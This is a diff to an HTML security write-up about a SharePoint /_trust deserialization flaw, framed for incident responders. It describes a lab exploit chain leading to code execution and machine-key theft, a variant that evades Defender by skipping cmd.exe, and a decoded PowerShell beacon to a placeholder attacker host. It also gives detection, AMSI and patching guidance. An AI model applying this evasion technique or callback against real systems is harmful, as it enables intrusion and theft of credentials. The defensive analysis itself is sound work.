@@ -1,4 +1,10 @@
-<title>SharePoint /_trust Deserialization — wismansec</title>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="SharePoint /_trust WS-Federation deserialization: PoC and detection notes from an isolated lab reconstruction.">
+<title>SharePoint /_trust Deserialization | wismansec</title>
 <style>
   :root{
     /* dark is the brand-primary ground */
@@ -42,7 +48,7 @@
   .eyebrow::before{content:"~$ ";color:var(--faint)}
   .muted{color:var(--muted)}
 
-  /* header — brand banner treatment: near-black ground, purple radial glow, faint scanlines */
+  /* header: brand banner treatment: near-black ground, purple radial glow, faint scanlines */
   header.hero{position:relative;overflow:hidden;border-bottom:1px solid var(--line);
     background:
       radial-gradient(120% 140% at 88% 120%, color-mix(in srgb,var(--accent) 26%,transparent), transparent 55%),
@@ -115,6 +121,25 @@
   .treecard pre{margin:0;border:0;background:transparent;padding:0;font-size:.8rem;color:var(--ink)}
   @media (max-width:640px){.trees{grid-template-columns:1fr}}
 
+  figure{margin:20px 0}
+  figure img{width:100%;height:auto;display:block;border:1px solid var(--line);border-radius:8px;
+    background:var(--code-bg)}
+  figure a{display:block;line-height:0}
+  figcaption{color:var(--muted);font-size:.84rem;line-height:1.55;margin-top:9px;max-width:var(--measure)}
+  figcaption b{color:var(--ink);font-weight:600}
+  figure a img{cursor:zoom-in;transition:border-color .15s}
+  figure a:hover img{border-color:var(--accent)}
+
+  .lightbox{position:fixed;inset:0;z-index:100;display:none;padding:28px;cursor:zoom-out;
+    background:rgba(6,9,10,.94);align-items:center;justify-content:center;flex-direction:column;gap:14px}
+  .lightbox.open{display:flex}
+  .lightbox img{max-width:100%;max-height:calc(100% - 44px);object-fit:contain;
+    border:1px solid var(--line);border-radius:8px;background:var(--code-bg)}
+  .lightbox .cap{font-family:var(--font-mono);font-size:.74rem;color:var(--muted);text-align:center;
+    max-width:80ch}
+  .lightbox .cap kbd{border:1px solid var(--line);border-radius:4px;padding:1px 5px;color:var(--ink)}
+  @media (prefers-reduced-motion:reduce){figure a img{transition:none}}
+
   ol.steps{counter-reset:s;list-style:none;padding:0;margin:14px 0;max-width:var(--measure)}
   ol.steps li{position:relative;padding:12px 12px 12px 46px;border:1px solid var(--line);border-radius:8px;
     background:var(--surface);margin:10px 0}
@@ -134,20 +159,21 @@
     @keyframes rise{to{opacity:1;transform:none}}
   }
 </style>
-
+</head>
+<body>
 <header class="hero">
   <div class="wrap">
     <div class="lockup fade">~$ <b>wismansec</b><span class="cur blink"></span></div>
     <h1 class="fade">SharePoint /_trust WS-Federation deserialization</h1>
     <p class="lede fade">One unauthenticated sign-in request yields code execution in
-      <code>w3wp.exe</code> — and the same primitive steals the farm machine keys with no process,
+      <code>w3wp.exe</code>, and the same primitive steals the farm machine keys with no process,
       no beacon in a default-config farm. A lab reconstruction, built to show responders exactly what to hunt.</p>
     <div class="meta fade">
       <span>Affected&nbsp; <b>SharePoint Server 2016 · 2019 · Subscription Edition</b></span>
       <span>Fix&nbsp; <b>July 2026 · KB5002882</b></span>
       <span>CVEs (CISA KEV)&nbsp; <b>2026-50522 · 45659 · 56164 · 58644</b></span>
       <span>Scope&nbsp; <b>isolated personal lab</b></span>
-      <span class="redact">lab hosts · keys · OAST redacted</span>
+      <span class="redact">keys · OAST redacted · hosts sanitized</span>
       <span><a href="https://github.com/WismanSec/sharepoint-2026-poc" style="color:var(--accent);text-decoration:none;font-weight:600">↳ source &amp; scripts on GitHub</a></span>
     </div>
   </div>
@@ -161,14 +187,14 @@
         <h4>TL;DR for responders</h4>
         <ul>
           <li>A single unauthenticated <code>POST /_trust/default.aspx</code> carrying a malicious
-            <code>SecurityContextToken</code> triggers <b>BinaryFormatter deserialization</b> in
-            <code>w3wp.exe</code> → <b>RCE as the web-app pool identity</b>.</li>
-          <li>The same primitive dumps the farm <b>machine keys</b> entirely in-process — in a
-            default-config farm, <b>no child process, no Defender alert, no beacon</b> (enabling AMSI
+            <code>SecurityContextToken</code> triggers BinaryFormatter deserialization in
+            <code>w3wp.exe</code> → RCE as the web-app pool identity.</li>
+          <li>The same primitive dumps the farm machine keys entirely in-process. In a
+            default-config farm: <b>no child process, no Defender alert, no beacon</b> (enabling AMSI
             request-body scanning for <code>/_trust</code> detects and blocks it). Stolen keys forge
-            <code>__VIEWSTATE</code>/auth tokens <b>that survive patching</b>.</li>
-          <li><b>Patching is not enough — rotate machine keys</b>, and hunt the <code>/_trust</code>
-            request: it is the one artifact present in <em>every</em> variant.</li>
+            <code>__VIEWSTATE</code>/auth tokens that survive patching.</li>
+          <li><b>Patching is not enough: rotate machine keys</b>, and hunt the <code>/_trust</code>
+            request: it is the one artifact present in every variant.</li>
         </ul>
       </div>
     </section>
@@ -180,7 +206,7 @@
         <p>SharePoint exposes a WS-Federation passive sign-in endpoint at
           <code>/_trust/default.aspx</code>. A crafted response embeds a
           <code>SecurityContextToken</code> whose <code>&lt;Cookie&gt;</code> is a base64,
-          DEFLATE-compressed <b>BinaryFormatter</b> stream — decompressed and deserialized
+          DEFLATE-compressed <b>BinaryFormatter</b> stream, decompressed and deserialized
           <b>without type restriction</b>, so a <code>ysoserial.net</code> gadget chain executes
           inside the worker.</p>
       </div>
@@ -212,10 +238,19 @@ wa=wsignin1.0&amp;wctx=&lt;url&gt;&amp;wresult=&lt;RequestSecurityTokenResponse&
     <section>
       <div class="sec-head col"><span class="eyebrow">03 results</span></div>
       <h2 class="col">Invocation → artifact matrix</h2>
-      <p class="col">Every row is one real detonation; artifacts pulled from the SIEM and OOB
+      <p class="col">Every row is one real detonation; artifacts pulled from the SIEM
+        (<a href="https://github.com/nano-rs/nano">nano</a>) and OOB
         listener per run. Identity throughout: <code>LAB\sp_pool</code>, High integrity.
         <span class="muted">Chips:</span> <span class="chip off">offense won</span>
         <span class="chip def">defense fired</span></p>
+
+      <div class="call off col">
+        <h4>Screenshots are unmodified</h4>
+        <p style="margin:.2rem 0 0">They carry the lab's real host and NetBIOS names, which are crude
+          and <b>differ from the sanitized <code>SHAREPOINT01</code> / <code>LAB</code> used
+          throughout the text</b>. Same runs, same events, nothing staged. Work-safe equivalents in
+          <a href="https://github.com/WismanSec/sharepoint-2026-poc/tree/main/artifacts">artifacts/</a>.</p>
+      </div>
       <div class="tablecard">
         <div class="scroll">
           <table>
@@ -253,7 +288,7 @@ wa=wsignin1.0&amp;wctx=&lt;url&gt;&amp;wresult=&lt;RequestSecurityTokenResponse&
               </tr>
               <tr>
                 <td class="inv">Key dump</td>
-                <td class="tree dim">— in-process —</td>
+                <td class="tree dim">(in-process)</td>
                 <td><span class="chip off">no detection</span></td>
                 <td><span class="chip na">none</span></td>
                 <td><span class="chip key">stealth</span> only the <code>/_trust</code> POST + response</td>
@@ -265,12 +300,21 @@ wa=wsignin1.0&amp;wctx=&lt;url&gt;&amp;wresult=&lt;RequestSecurityTokenResponse&
       <p class="col" style="font-size:.82rem;color:var(--muted);margin:8px 0 0">These outcomes are for the
         <b>default AMSI configuration</b> (Balanced mode, <code>/_trust</code> not scanned). With AMSI
         request-body scanning of <code>/_trust</code> enabled, every row is instead blocked at the request
-        layer — HTTP 400, <code>Exploit:Script/SpCookieExec.A</code>, before execution (see the AMSI
+        layer: HTTP 400, <code>Exploit:Script/SpCookieExec.A</code>, before execution (see the AMSI
         request-body scanning section).</p>
       <p class="col" style="font-size:.82rem;color:var(--muted);margin:4px 0 0">Status is not a reliable
-        success signal — successful runs returned both HTTP 200 and a connection reset.</p>
+        success signal; successful runs returned both HTTP 200 and a connection reset.</p>
 
-      <h3 class="col">Same exploit, two trees — only one is seen</h3>
+      <figure>
+        <a href="assets/01-w3wp-children.png" target="_blank" rel="noopener">
+          <img src="assets/01-w3wp-children.png" alt="Four processes spawned by w3wp.exe, three of them powershell.exe with no cmd.exe hop"></a>
+        <figcaption>All four documented detonations, 15:01 to 15:18 UTC: every child of
+          <code>w3wp.exe</code> running as the pool identity. <b>Three of the four are
+          <code>powershell.exe</code> spawned directly.</b> Only the 15:03:34 run goes through
+          <code>cmd.exe</code>, and only that run was detected.</figcaption>
+      </figure>
+
+      <h3 class="col">Same exploit, two trees: only one is seen</h3>
       <div class="trees">
         <div class="treecard">
           <div class="tag"><span>default</span><span class="chip def">detected</span></div>
@@ -289,12 +333,65 @@ wa=wsignin1.0&amp;wctx=&lt;url&gt;&amp;wresult=&lt;RequestSecurityTokenResponse&
         </div>
       </div>
 
-      <p class="col">The command line recovers verbatim from <b>Security 4688</b> — the encoding is
+      <figure>
+        <a href="assets/02-tree-cmd.png" target="_blank" rel="noopener">
+          <img src="assets/02-tree-cmd.png" alt="w3wp.exe to cmd.exe to powershell.exe and conhost.exe"></a>
+        <figcaption>Default invocation as the SIEM records it:
+          <code>w3wp.exe → cmd.exe → powershell.exe</code>, with <code>conhost.exe</code> alongside.
+          This is the shape <code>Behavior:Win32/WebshellLauncher.A</code> keys on.</figcaption>
+      </figure>
+
+      <figure>
+        <a href="assets/03-tree-rawcmd.png" target="_blank" rel="noopener">
+          <img src="assets/03-tree-rawcmd.png" alt="w3wp.exe to powershell.exe to conhost.exe, with no cmd.exe"></a>
+        <figcaption><code>-RawCmd</code>, same primitive and same payload, with the
+          <code>cmd.exe</code> hop removed. <b>Defender produced nothing for this run.</b> A detection
+          built on <code>w3wp → cmd</code> misses it entirely.</figcaption>
+      </figure>
+
+      <figure>
+        <a href="assets/04-defender.png" target="_blank" rel="noopener">
+          <img src="assets/04-defender.png" alt="Three Defender events, all Behavior:Win32/WebshellLauncher.A, severity Severe, action Remove"></a>
+        <figcaption>Every Defender event in the same 25-minute window that contained four detonations.
+          <b>All three belong to the single <code>cmd.exe</code> run:</b> two <code>malware_detected</code>
+          at Severe, then <code>malware_action_taken</code> with action <code>Remove</code>. Remediation
+          did not beat the beacon.</figcaption>
+      </figure>
+
+      <p class="col">The command line recovers verbatim from <b>Security 4688</b>: the encoding is
         not obfuscation:</p>
       <pre class="col" style="max-width:var(--measure)"><code>powershell.exe -EncodedCommand &lt;base64&gt;
   # base64(UTF-16LE) → iwr -UseBasicParsing 'http://&lt;attacker-oast&gt;/c'</code></pre>
+
+      <figure>
+        <a href="assets/05-encodedcommand.png" target="_blank" rel="noopener">
+          <img src="assets/05-encodedcommand.png" alt="Security 4688 events with -EncodedCommand highlighted and the base64 payload visible"></a>
+        <figcaption>The encoded command line in the SIEM. Base64 of UTF-16LE and nothing more;
+          <code>base64 -d | iconv -f utf-16le -t utf-8</code> recovers the callback in one step.</figcaption>
+      </figure>
+
       <p class="col"><code>-Diag</code> disclosure captured at the OOB listener:</p>
       <pre class="col" style="max-width:var(--measure)"><code>{ "host":"SHAREPOINT01", "who":"LAB\\sp_pool", "v":"5.1.20348.558", "lm":"FullLanguage" }</code></pre>
+
+      <h3 class="col">The key-dump leaves nothing behind</h3>
+      <p class="col">Both frames cover the identical 90-second window in which the farm machine keys
+        were stolen.</p>
+
+      <figure>
+        <a href="assets/06a-window-alive.png" target="_blank" rel="noopener">
+          <img src="assets/06a-window-alive.png" alt="Twenty events in the key-dump window, showing telemetry flowing normally"></a>
+        <figcaption>Unfiltered, the window holds <b>20 events</b>. The host is alive and shipping
+          telemetry.</figcaption>
+      </figure>
+
+      <figure>
+        <a href="assets/06b-window-empty.png" target="_blank" rel="noopener">
+          <img src="assets/06b-window-empty.png" alt="The same window filtered to children of w3wp.exe, returning no results"></a>
+        <figcaption>Filtered to children of <code>w3wp.exe</code>, the same window is <b>empty</b>. No
+          process, no Defender event, no beacon. The keys left over the HTTP response, and the only
+          host-side artifact was the <code>/_trust</code> request itself. Patching does not revoke
+          stolen keys; rotate them.</figcaption>
+      </figure>
     </section>
 
     <section>
@@ -314,14 +411,14 @@ wa=wsignin1.0&amp;wctx=&lt;url&gt;&amp;wresult=&lt;RequestSecurityTokenResponse&
       <div class="call off col" style="max-width:var(--measure)">
         <h4>Process-pattern evasion</h4>
         <p style="margin:.2rem 0 0">The <code>-RawCmd</code> variant is <code>w3wp → powershell</code>
-          directly and drew <b>zero</b> Defender events. Hunt <code>w3wp.exe</code> spawning
+          directly and drew zero Defender events. Hunt <code>w3wp.exe</code> spawning
           <code>powershell.exe</code> <b>with no cmd.exe hop</b>, and decode any
           <code>-EncodedCommand</code> straight from 4688.</p>
       </div>
       <div class="call off col" style="max-width:var(--measure)">
         <h4>Detection is not prevention</h4>
         <p style="margin:.2rem 0 0">On the cmd tree Defender fired <code>WebshellLauncher.A</code>
-          and <em>removed</em> the chain — yet the beacon (DNS + HTTP) still completed first. On any
+          and <em>removed</em> the chain, yet the beacon (DNS + HTTP) still completed first. On any
           such detection, <b>also pull DNS/proxy/egress</b> for the callback domain around that time.</p>
       </div>
       <div class="call def col" style="max-width:var(--measure)">
@@ -329,10 +426,10 @@ wa=wsignin1.0&amp;wctx=&lt;url&gt;&amp;wresult=&lt;RequestSecurityTokenResponse&
         <p style="margin:.2rem 0 0">Both chains carry their payload in the <code>/_trust</code> request
           body. In the default configuration (Balanced mode, <code>/_trust</code> not in the
           targeted-endpoint list) the body is not scanned and both chains execute with no detection.
-          Setting body-scan to <b>Full</b>, or keeping Balanced and adding
+          Setting body-scan to Full, or keeping Balanced and adding
           <code>/_trust/default.aspx</code> as a targeted endpoint, rejects the request
-          <b>HTTP 400 before deserialization</b> — no process is created — and Defender records
-          <code>Exploit:Script/SpCookieExec.A</code> (source <b>AMSI</b>, action <b>Quarantine</b>)
+          HTTP 400 before deserialization (no process is created), and Defender records
+          <code>Exploit:Script/SpCookieExec.A</code> (source AMSI, action Quarantine)
           for both chains.</p>
       </div>
       <pre class="col" style="max-width:var(--measure)"><code>$wa = Get-SPWebApplication https://&lt;webapp&gt;
@@ -384,29 +481,29 @@ $wa.Update(); iisreset</code></pre>
           </tbody>
         </table></div>
       </div>
-      <p class="col">The pre-patch transform chain was <b>deflate-only</b> — no encryption and no
+      <p class="col">The pre-patch transform chain was deflate-only, with no encryption and no
         MAC/signature transform keyed on the machine key. The base <code>ReadToken</code> applies the
         transforms and deserializes the cookie value, so a forged token is inflated and deserialized
         <b>with no machine-key validation gate</b>; the gadget fires without the
         <code>ValidationKey</code>/<code>DecryptionKey</code> (key-independent). The fix <b>removes the
-        sink</b> rather than adding a signature or decryption check — there was no key gate to fix.</p>
+        sink</b> rather than adding a signature or decryption check; there was no key gate to fix.</p>
       <p class="col">The machine-key disclosure is therefore a <b>separate persistence objective</b>
         (forging <code>FedAuth</code>/<code>SecurityContextToken</code>/<code>__VIEWSTATE</code>), not a
-        prerequisite for the RCE — the key-dump is itself an RCE over the same path and runs before any
+        prerequisite for the RCE; the key-dump is itself an RCE over the same path and runs before any
         key is stolen. A second, unrelated hardening ships in the same July CU (JWT actor-token
-        signature validation in <code>SPJsonWebSecurityTokenHandlerV2</code>) — a distinct path, not the
+        signature validation in <code>SPJsonWebSecurityTokenHandlerV2</code>), a distinct path, not the
         one covered here.</p>
       <div class="call def col" style="max-width:var(--measure)">
-        <h4>Applying the fix — and two settings that undo it</h4>
+        <h4>Applying the fix, and two settings that undo it</h4>
         <p style="margin:.2rem 0 .4rem">The fix is the July CU (<b>KB5002882</b>): it swaps the deflate-only
           cookie transform for one that throws, removing the sink. Install it, then confirm neither farm
           setting reverts or bypasses it:</p>
         <ul>
           <li><code>SessionCookieTransformProtectionEnabled</code> set to <code>false</code> reverts the
-            session-token cookie to the vulnerable deflate-only transform, re-opening the RCE and key-dump —
+            session-token cookie to the vulnerable deflate-only transform, re-opening the RCE and key-dump;
             leave it at its default.</li>
           <li>The <code>DisableActorTokenSignatureValidation</code> debug flag re-opens the separate JWT
-            actor-token signature bypass hardened in the same update — confirm it is not set.</li>
+            actor-token signature bypass hardened in the same update; confirm it is not set.</li>
         </ul>
       </div>
     </section>
@@ -426,3 +523,48 @@ $wa.Update(); iisreset</code></pre>
       MITRE ATT&amp;CK T1190 · T1059.001 · T1552 · T1550</div>
   </div>
 </footer>
+<div class="lightbox" id="lightbox" role="dialog" aria-modal="true" aria-label="Enlarged screenshot">
+  <img id="lightbox-img" alt="">
+  <div class="cap">click anywhere or press <kbd>Esc</kbd> to close</div>
+</div>
+
+<script>
+(function () {
+  var box = document.getElementById('lightbox');
+  var img = document.getElementById('lightbox-img');
+  var lastFocus = null;
+
+  function open(src, alt, trigger) {
+    lastFocus = trigger;
+    img.src = src;
+    img.alt = alt || '';
+    box.classList.add('open');
+    document.body.style.overflow = 'hidden';
+    box.focus();
+  }
+
+  function close() {
+    box.classList.remove('open');
+    document.body.style.overflow = '';
+    img.src = '';
+    if (lastFocus) { lastFocus.focus(); lastFocus = null; }
+  }
+
+  // Progressive enhancement: without JS the anchors still open the full-size image in a new tab.
+  document.querySelectorAll('figure a[href$=".png"]').forEach(function (a) {
+    a.addEventListener('click', function (e) {
+      if (e.metaKey || e.ctrlKey || e.shiftKey || e.button !== 0) return; // let modified clicks through
+      e.preventDefault();
+      var i = a.querySelector('img');
+      open(a.getAttribute('href'), i && i.alt, a);
+    });
+  });
+
+  box.addEventListener('click', close);
+  document.addEventListener('keydown', function (e) {
+    if (e.key === 'Escape' && box.classList.contains('open')) close();
+  });
+})();
+</script>
+</body>
+</html>
